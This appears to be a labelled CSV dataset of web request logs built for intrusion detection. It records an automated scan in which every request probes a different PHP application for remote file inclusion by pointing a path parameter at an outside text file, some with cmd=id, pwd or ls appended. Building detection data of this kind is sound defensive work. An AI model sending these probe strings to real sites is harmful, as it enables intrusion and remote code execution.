timestamp,ip,method,url,status,payloadSize,payloadSnippet,userAgent,responseTimeMs,time_delta,auth_fail,rapid_request,large_payload,is_get,xss_pattern,sqli_pattern,fail_rolling,label
2026-01-01 08:09:42.804000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.805000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.805000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.806000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.807000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.808000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.809000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.809000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_tour_toto/admin.tour_toto.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.810000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.811000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_webring/admin.webring.docs.php?component_dir=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.813000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.814000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.815000+00:00,::ffff:127.0.0.1,GET,/administrator/components/com_wmtrssreader/admin.wmtrssreader.php?mosConfig_live_site=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.817000+00:00,::ffff:127.0.0.1,GET,/administrator/menu_operation.php?site_absolute_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.817000+00:00,::ffff:127.0.0.1,GET,/administrator/menu_add.php?site_absolute_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.819000+00:00,::ffff:127.0.0.1,GET,/adminpanel/includes/add_forms/addmp3.php?GLOBALS[root_path]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.820000+00:00,::ffff:127.0.0.1,GET,/adminpanel/includes/mailinglist/mlist_xls.php?GLOBALS[root_path]=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.821000+00:00,::ffff:127.0.0.1,GET,/adodb/adodb-errorpear.inc.php?ourlinux_root_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.822000+00:00,::ffff:127.0.0.1,GET,/adodb/adodb-pear.inc.php?ourlinux_root_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.823000+00:00,::ffff:127.0.0.1,GET,/adodb/adodb.inc.php?path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.825000+00:00,::ffff:127.0.0.1,GET,/advanced_comment_system/admin.php?ACS_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.826000+00:00,::ffff:127.0.0.1,GET,/advanced_comment_system/index.php?ACS_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.828000+00:00,::ffff:127.0.0.1,GET,/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.829000+00:00,::ffff:127.0.0.1,GET,/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.830000+00:00,::ffff:127.0.0.1,GET,/agenda.php3?rootagenda=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.831000+00:00,::ffff:127.0.0.1,GET,/agenda2.php3?rootagenda=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.832000+00:00,::ffff:127.0.0.1,GET,/aides/index.php?page=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.833000+00:00,::ffff:127.0.0.1,GET,/ains_main.php?ains_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.834000+00:00,::ffff:127.0.0.1,GET,/ajouter.php?include=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.834000+00:00,::ffff:127.0.0.1,GET,/ajax/loadsplash.php?full_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.837000+00:00,::ffff:127.0.0.1,GET,/akarru.gui/main_content.php?bm_content=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.003,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.838000+00:00,::ffff:127.0.0.1,GET,/akocomments.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.839000+00:00,::ffff:127.0.0.1,GET,/amazon/cart.php?cmd=add&asin=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.840000+00:00,::ffff:127.0.0.1,GET,/amazon/index.php?lang=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.841000+00:00,::ffff:127.0.0.1,GET,/amazon/info.php?asin=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.843000+00:00,::ffff:127.0.0.1,GET,/annonce.php?page=http://blog.cirt.net/rfiinc.txt?&cmd=id,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.844000+00:00,::ffff:127.0.0.1,GET,/announcements.php?phpraid_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.845000+00:00,::ffff:127.0.0.1,GET,/anzagien.php?config[root_ordner]=http://blog.cirt.net/rfiinc.txt?cmd=id,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.845000+00:00,::ffff:127.0.0.1,GET,/apbn/templates/head.php?APB_SETTINGS[template_path]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.846000+00:00,::ffff:127.0.0.1,GET,/api.php?t_path_core=http://blog.cirt.net/rfiinc.txt?&cmd=id,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.849000+00:00,::ffff:127.0.0.1,GET,/apps/apps.php?app=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.003,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.850000+00:00,::ffff:127.0.0.1,GET,/appserv/main.php?appserv_root=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.851000+00:00,::ffff:127.0.0.1,GET,/arab3upload/customize.php?path=http://blog.cirt.net/rfiinc.txt?&cmd=pwd,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.852000+00:00,::ffff:127.0.0.1,GET,/arab3upload/initialize.php?path=http://blog.cirt.net/rfiinc.txt?&cmd=pwd,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.853000+00:00,::ffff:127.0.0.1,GET,/arash_lib/class/arash_gadmin.class.php?arashlib_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.854000+00:00,::ffff:127.0.0.1,GET,/arash_lib/class/arash_sadmin.class.php?arashlib_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.855000+00:00,::ffff:127.0.0.1,GET,/arash_lib/include/edit.inc.php?arashlib_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.856000+00:00,::ffff:127.0.0.1,GET,/arash_lib/include/list_features.inc.php?arashlib_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.857000+00:00,::ffff:127.0.0.1,GET,/archive.php?scriptpath=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.858000+00:00,::ffff:127.0.0.1,GET,/aroundme/template/barnraiser_01/pol_view.tpl.php?poll=1&templatePath=http://blog.cirt.net/rfiinc.txt%00,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.860000+00:00,::ffff:127.0.0.1,GET,/artlist.php?root_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.861000+00:00,::ffff:127.0.0.1,GET,/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://blog.cirt.net/rfiinc.txt?cmd,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.862000+00:00,::ffff:127.0.0.1,GET,/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.863000+00:00,::ffff:127.0.0.1,GET,/athena.php?athena_dir=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.864000+00:00,::ffff:127.0.0.1,GET,/auction/auction_common.php?phpbb_root_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.865000+00:00,::ffff:127.0.0.1,GET,/auction/includes/converter.inc.php?include_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.866000+00:00,::ffff:127.0.0.1,GET,/auction/includes/messages.inc.php?include_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.867000+00:00,::ffff:127.0.0.1,GET,/auction/phpAdsNew/view.inc.php?phpAds_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.867000+00:00,::ffff:127.0.0.1,GET,/auction/includes/settings.inc.php?include_path=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.0,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.868000+00:00,::ffff:127.0.0.1,GET,/auth.cookie.inc.php?da_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.871000+00:00,::ffff:127.0.0.1,GET,/auth.header.inc.php?da_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.003,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.872000+00:00,::ffff:127.0.0.1,GET,/auth.sessions.inc.php?da_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.873000+00:00,::ffff:127.0.0.1,GET,/auth/auth.php?phpbb_root_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.874000+00:00,::ffff:127.0.0.1,GET,/auth/auth_phpbb/phpbb_root_path=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.875000+00:00,::ffff:127.0.0.1,GET,/authenticate.php?default_path_for_themes=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.876000+00:00,::ffff:127.0.0.1,GET,/authentication/phpbb3/phpbb3.functions.php?pConfig_auth[phpbb_path]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.877000+00:00,::ffff:127.0.0.1,GET,/authentication/smf/smf.functions.php?pConfig_auth[smf_path]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.878000+00:00,::ffff:127.0.0.1,GET,/auto_check_renewals.php?installed_config_file=http://blog.cirt.net/rfiinc.txt?cmd=ls,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.879000+00:00,::ffff:127.0.0.1,GET,/autoindex.php?cfg_file=http://blog.cirt.net/rfiinc.txt?,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.880000+00:00,::ffff:127.0.0.1,GET,/awzmb/adminhelp.php?Setting[OPT_includepath]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.882000+00:00,::ffff:127.0.0.1,GET,/awzmb/modules/admin.incl.php?Setting[OPT_includepath]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.002,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.883000+00:00,::ffff:127.0.0.1,GET,/awzmb/modules/core/core.incl.php?Setting[OPT_includepath]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.884000+00:00,::ffff:127.0.0.1,GET,/awzmb/modules/gbook.incl.php?Setting[OPT_includepath]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",0,0.001,0,1,0,1,0,1,0.0,recon
2026-01-01 08:09:42.886000+00:00,::ffff:127.0.0.1,GET,/awzmb/modules/help.incl.php?Setting[OPT_includepath]=http://blog.cirt.net/rfiinc.txt,404,2,"""""","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",1,0.002,0,1,0,1,0,1,0.0,recon
